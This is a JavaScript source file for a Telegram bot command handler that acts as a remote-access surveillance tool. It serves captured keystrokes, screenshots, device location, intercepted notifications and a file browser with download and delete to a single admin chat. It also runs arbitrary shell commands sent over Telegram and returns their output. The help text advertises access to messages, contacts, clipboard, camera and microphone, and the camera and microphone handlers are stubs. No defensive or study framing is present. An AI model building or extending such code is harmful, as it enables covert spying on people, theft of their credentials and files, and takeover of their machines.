const os = require('os');
const si = require('systeminformation');
const { exec } = require('child_process');
const { promisify } = require('util');
const execAsync = promisify(exec);
const Logger = require('../utils/Logger');

class CommandHandler {
    constructor(bot, database, fileManager, monitoringService) {
        this.bot = bot;
        this.database = database;
        this.fileManager = fileManager;
        this.monitoringService = monitoringService;
        this.logger = new Logger();
        this.adminId = parseInt(process.env.TELEGRAM_ADMIN_ID);
    }
    
    async handleStatus(msg) {
        const chatId = msg.chat.id;
        if (!this.isAuthorized(msg.from.id)) return;
        
        try {
            const status = await this.getSystemStatus();
            const message = this.formatStatusMessage(status);
            
            await this.bot.sendMessage(chatId, message, {
                parse_mode: 'Markdown'
            });
        } catch (error) {
            this.logger.error('Status command error:', error);
            await this.bot.sendMessage(chatId, '❌ Failed to get system status');
        }
    }
    
    async handleScreenshot(msg) {
        const chatId = msg.chat.id;
        if (!this.isAuthorized(msg.from.id)) return;
        
        await this.bot.sendMessage(chatId, '📸 Taking screenshot...');
        
        try {
            const screenshot = await this.monitoringService.takeScreenshot();
            if (screenshot) {
                await this.bot.sendPhoto(chatId, screenshot, {
                    caption: `📸 Screenshot taken at ${new Date().toLocaleString()}`
                });
            } else {
                await this.bot.sendMessage(chatId, '❌ Screenshot feature not available on server');
            }
        } catch (error) {
            this.logger.error('Screenshot error:', error);
            await this.bot.sendMessage(chatId, '❌ Failed to take screenshot');
        }
    }
    
    async handleFileManager(msg) {
        const chatId = msg.chat.id;
        if (!this.isAuthorized(msg.from.id)) return;
        
        try {
            const files = await this.fileManager.listDirectory('/');
            const message = this.formatFileList('/', files);
            
            await this.bot.sendMessage(chatId, message, {
                parse_mode: 'Markdown'
            });
        } catch (error) {
            this.logger.error('File manager error:', error);
            await this.bot.sendMessage(chatId, '❌ Failed to access file system');
        }
    }
    
    async handleFileManagerCallback(query, params) {
        const chatId = query.message.chat.id;
        const messageId = query.message.message_id;
        const [action, ...actionParams] = params;
        
        try {
            switch (action) {
                case 'dir':
                    const dirPath = actionParams.join(':');
                    const files = await this.fileManager.listDirectory(dirPath);
                    await this.updateFileManagerMessage(chatId, messageId, dirPath, files);
                    break;
                    
                case 'file':
                    const filePath = actionParams.join(':');
                    await this.handleFileAction(chatId, filePath);
                    break;
                    
                case 'download':
                    const downloadPath = actionParams.join(':');
                    await this.fileManager.sendFile(chatId, downloadPath, this.bot);
                    break;
                    
                case 'delete':
                    const deletePath = actionParams.join(':');
                    await this.fileManager.deleteFile(deletePath);
                    await this.bot.sendMessage(chatId, '✅ File deleted successfully');
                    break;
            }
        } catch (error) {
            this.logger.error('File callback error:', error);
            await this.bot.answerCallbackQuery(query.id, {
                text: 'Error processing file action',
                show_alert: true
            });
        }
    }
    
    async handleKeylog(msg) {
        const chatId = msg.chat.id;
        if (!this.isAuthorized(msg.from.id)) return;
        
        try {
            const keylogs = await this.database.getKeylogs(100);
            
            if (keylogs.length === 0) {
                await this.bot.sendMessage(chatId, '📝 No keylogs recorded yet');
                return;
            }
            
            const message = this.formatKeylogs(keylogs);
            await this.bot.sendMessage(chatId, message, {
                parse_mode: 'Markdown'
            });
        } catch (error) {
            this.logger.error('Keylog error:', error);
            await this.bot.sendMessage(chatId, '❌ Failed to retrieve keylogs');
        }
    }
    
    async handleSystemInfo(msg) {
        const chatId = msg.chat.id;
        if (!this.isAuthorized(msg.from.id)) return;
        
        try {
            const sysInfo = await this.getDetailedSystemInfo();
            const message = this.formatSystemInfo(sysInfo);
            
            await this.bot.sendMessage(chatId, message, {
                parse_mode: 'Markdown'
            });
        } catch (error) {
            this.logger.error('System info error:', error);
            await this.bot.sendMessage(chatId, '❌ Failed to get system information');
        }
    }
    
    async handleLocation(msg) {
        const chatId = msg.chat.id;
        if (!this.isAuthorized(msg.from.id)) return;
        
        try {
            const location = await this.monitoringService.getLocation();
            
            if (location) {
                await this.bot.sendLocation(chatId, location.latitude, location.longitude);
                await this.bot.sendMessage(chatId, 
                    `📍 *Location Details*\n\n` +
                    `Accuracy: ${location.accuracy}m\n` +
                    `Timestamp: ${new Date(location.timestamp).toLocaleString()}`,
                    { parse_mode: 'Markdown' }
                );
            } else {
                await this.bot.sendMessage(chatId, '📍 Location service not available');
            }
        } catch (error) {
            this.logger.error('Location error:', error);
            await this.bot.sendMessage(chatId, '❌ Failed to get location');
        }
    }
    
    async handleCamera(msg) {
        const chatId = msg.chat.id;
        if (!this.isAuthorized(msg.from.id)) return;
        
        await this.bot.sendMessage(chatId, '📷 Camera feature simulation\n\nIn a real implementation, this would access device camera.');
    }
    
    async handleMicrophone(msg) {
        const chatId = msg.chat.id;
        if (!this.isAuthorized(msg.from.id)) return;
        
        await this.bot.sendMessage(chatId, '🎤 Microphone feature simulation\n\nIn a real implementation, this would record audio.');
    }
    
    async handleNotifications(msg) {
        const chatId = msg.chat.id;
        if (!this.isAuthorized(msg.from.id)) return;
        
        try {
            const notifications = await this.database.getNotifications(20);
            
            if (notifications.length === 0) {
                await this.bot.sendMessage(chatId, '🔔 No notifications captured');
                return;
            }
            
            const message = this.formatNotifications(notifications);
            await this.bot.sendMessage(chatId, message, {
                parse_mode: 'Markdown'
            });
        } catch (error) {
            this.logger.error('Notifications error:', error);
            await this.bot.sendMessage(chatId, '❌ Failed to retrieve notifications');
        }
    }
    
    async handleExecute(msg, command) {
        const chatId = msg.chat.id;
        if (!this.isAuthorized(msg.from.id)) return;
        
        await this.bot.sendMessage(chatId, `⚡ Executing: \`${command}\``, {
            parse_mode: 'Markdown'
        });
        
        try {
            const { stdout, stderr } = await execAsync(command, { 
                timeout: 30000,
                maxBuffer: 1024 * 1024 * 5 // 5MB buffer
            });
            
            const output = stdout || stderr || 'Command executed successfully (no output)';
            
            // Split long messages
            const maxLength = 4000;
            if (output.length > maxLength) {
                const chunks = output.match(new RegExp('.{1,' + maxLength + '}', 'g'));
                for (const chunk of chunks) {
                    await this.bot.sendMessage(chatId, `\`\`\`\n${chunk}\n\`\`\``, {
                        parse_mode: 'Markdown'
                    });
                }
            } else {
                await this.bot.sendMessage(chatId, `\`\`\`\n${output}\n\`\`\``, {
                    parse_mode: 'Markdown'
                });
            }
            
            // Log command execution
            await this.database.logActivity('command_execution', {
                command,
                output: output.substring(0, 500)
            });
            
        } catch (error) {
            this.logger.error('Command execution error:', error);
            await this.bot.sendMessage(chatId, `❌ Command failed: ${error.message}`);
        }
    }
    
    async handleSettings(msg) {
        const chatId = msg.chat.id;
        if (!this.isAuthorized(msg.from.id)) return;
        
        const settings = await this.database.getSettings();
        const message = this.formatSettings(settings);
        
        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'Markdown'
        });
    }
    
    async handleHelp(msg) {
        const chatId = msg.chat.id;
        if (!this.isAuthorized(msg.from.id)) return;
        
        const helpMessage = `
📚 *Help & Commands*

*Monitoring Commands:*
/status - System status overview
/screenshot - Take a screenshot
/keylog - View captured keystrokes
/location - Get current location
/notifications - View notifications

*File Management:*
/files - Browse file system
Upload files directly to save them

*System Commands:*
/sysinfo - Detailed system information
/execute <cmd> - Execute system command
/apps - List installed applications

*Communication:*
/messages - View messages
/contacts - View contacts
/camera - Access camera
/microphone - Record audio

*Network:*
/wifi - WiFi information
/clipboard - Get clipboard content

*Settings:*
/settings - Bot configuration
/help - Show this help message

*Tips:*
• Use inline buttons for easier navigation
• Files can be uploaded directly to the bot
• All activities are logged for review
• Long outputs are automatically split
        `;
        
        await this.bot.sendMessage(chatId, helpMessage, {
            parse_mode: 'Markdown'
        });
    }
    
    // Helper methods
    
    async getSystemStatus() {
        const cpu = await si.currentLoad();
        const mem = await si.mem();
        const disk = await si.fsSize();
        const network = await si.networkInterfaces();
        const uptime = os.uptime();
        
        return {
            cpu: cpu.currentLoad.toFixed(1),
            memory: {
                used: (mem.used / 1024 / 1024 / 1024).toFixed(2),
                total: (mem.total / 1024 / 1024 / 1024).toFixed(2),
                percent: ((mem.used / mem.total) * 100).toFixed(1)
            },
            disk: disk.map(d => ({
                fs: d.fs,
                size: (d.size / 1024 / 1024 / 1024).toFixed(2),
                used: (d.used / 1024 / 1024 / 1024).toFixed(2),
                percent: d.use.toFixed(1)
            })),
            network: network.filter(n => !n.internal).map(n => ({
                iface: n.iface,
                ip4: n.ip4,
                mac: n.mac
            })),
            uptime: this.formatUptime(uptime)
        };
    }
    
    async getDetailedSystemInfo() {
        const osInfo = await si.osInfo();
        const cpu = await si.cpu();
        const graphics = await si.graphics();
        const processes = await si.processes();
        const battery = await si.battery();
        const wifi = await si.wifiNetworks();
        
        return {
            os: osInfo,
            cpu: cpu,
            graphics: graphics,
            processes: processes,
            battery: battery,
            wifi: wifi
        };
    }
    
    formatStatusMessage(status) {
        let message = '📊 *System Status*\n\n';
        
        message += `🖥 *CPU:* ${status.cpu}%\n`;
        message += `💾 *Memory:* ${status.memory.used}GB / ${status.memory.total}GB (${status.memory.percent}%)\n`;
        message += `⏱ *Uptime:* ${status.uptime}\n\n`;
        
        message += '💿 *Disk Usage:*\n';
        status.disk.forEach(d => {
            message += `  • ${d.fs}: ${d.used}GB / ${d.size}GB (${d.percent}%)\n`;
        });
        
        message += '\n🌐 *Network:*\n';
        status.network.forEach(n => {
            message += `  • ${n.iface}: ${n.ip4}\n`;
        });
        
        return message;
    }
    
    formatSystemInfo(info) {
        let message = '💻 *Detailed System Information*\n\n';
        
        message += `*OS:* ${info.os.distro} ${info.os.release}\n`;
        message += `*Platform:* ${info.os.platform} ${info.os.arch}\n`;
        message += `*Kernel:* ${info.os.kernel}\n\n`;
        
        message += `*CPU:* ${info.cpu.manufacturer} ${info.cpu.brand}\n`;
        message += `*Cores:* ${info.cpu.cores} (${info.cpu.physicalCores} physical)\n`;
        message += `*Speed:* ${info.cpu.speed} GHz\n\n`;
        
        if (info.graphics.controllers.length > 0) {
            message += '*Graphics:*\n';
            info.graphics.controllers.forEach(gpu => {
                message += `  • ${gpu.vendor} ${gpu.model}\n`;
            });
            message += '\n';
        }
        
        message += `*Processes:* ${info.processes.all} total, ${info.processes.running} running\n`;
        
        if (info.battery && info.battery.hasBattery) {
            message += `*Battery:* ${info.battery.percent}% ${info.battery.isCharging ? '(Charging)' : ''}\n`;
        }
        
        if (info.wifi && info.wifi.length > 0) {
            message += `*WiFi Networks:* ${info.wifi.length} available\n`;
        }
        
        return message;
    }
    
    formatFileList(path, files) {
        let message = `📁 *File Manager*\n\n`;
        message += `📍 Current: \`${path}\`\n\n`;
        
        if (files.length === 0) {
            message += '_Empty directory_';
        } else {
            files.slice(0, 20).forEach(file => {
                const icon = file.isDirectory ? '📂' : '📄';
                const size = file.isDirectory ? '' : ` (${this.formatBytes(file.size)})`;
                message += `${icon} ${file.name}${size}\n`;
            });
            
            if (files.length > 20) {
                message += `\n... and ${files.length - 20} more items`;
            }
        }
        
        return message;
    }
    
    formatKeylogs(keylogs) {
        let message = '⌨️ *Captured Keystrokes*\n\n';
        
        keylogs.forEach(log => {
            const time = new Date(log.timestamp).toLocaleTimeString();
            message += `[${time}] ${log.window || 'Unknown'}\n`;
            message += `\`${log.keys}\`\n\n`;
        });
        
        return message;
    }
    
    formatNotifications(notifications) {
        let message = '🔔 *Recent Notifications*\n\n';
        
        notifications.forEach(notif => {
            const time = new Date(notif.timestamp).toLocaleString();
            message += `*${notif.app}*\n`;
            message += `${notif.title}\n`;
            message += `_${notif.text}_\n`;
            message += `🕐 ${time}\n\n`;
        });
        
        return message;
    }
    
    formatSettings(settings) {
        let message = '⚙️ *Bot Settings*\n\n';
        
        message += `📸 *Screenshot Interval:* ${settings.screenshotInterval / 1000}s\n`;
        message += `⌨️ *Keylog Buffer:* ${settings.keylogBuffer} keystrokes\n`;
        message += `📁 *Max File Size:* ${this.formatBytes(settings.maxFileSize)}\n\n`;
        
        message += '*Features:*\n';
        message += `${settings.enableScreenshots ? '✅' : '❌'} Screenshots\n`;
        message += `${settings.enableKeylogging ? '✅' : '❌'} Keylogging\n`;
        message += `${settings.enableFileManager ? '✅' : '❌'} File Manager\n`;
        message += `${settings.enableNotifications ? '✅' : '❌'} Notifications\n`;
        
        return message;
    }
    
    formatUptime(seconds) {
        const days = Math.floor(seconds / 86400);
        const hours = Math.floor((seconds % 86400) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        
        const parts = [];
        if (days > 0) parts.push(`${days}d`);
        if (hours > 0) parts.push(`${hours}h`);
        if (minutes > 0) parts.push(`${minutes}m`);
        
        return parts.join(' ') || '0m';
    }
    
    formatBytes(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
    }
    
    async updateFileManagerMessage(chatId, messageId, path, files) {
        const message = this.formatFileList(path, files);
        
        await this.bot.editMessageText(message, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
    }
    
    async handleFileAction(chatId, filePath) {
        const fileInfo = await this.fileManager.getFileInfo(filePath);
        
        let message = `📄 *File Information*\n\n`;
        message += `*Name:* ${fileInfo.name}\n`;
        message += `*Size:* ${this.formatBytes(fileInfo.size)}\n`;
        message += `*Modified:* ${new Date(fileInfo.modified).toLocaleString()}\n`;
        message += `*Path:* \`${filePath}\`\n`;
        
        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'Markdown'
        });
        
        // Send file if it's small enough
        if (fileInfo.size < 50 * 1024 * 1024) { // 50MB limit
            await this.fileManager.sendFile(chatId, filePath, this.bot);
        }
    }
    
    isAuthorized(userId) {
        return userId === this.adminId;
    }
}

module.exports = CommandHandler;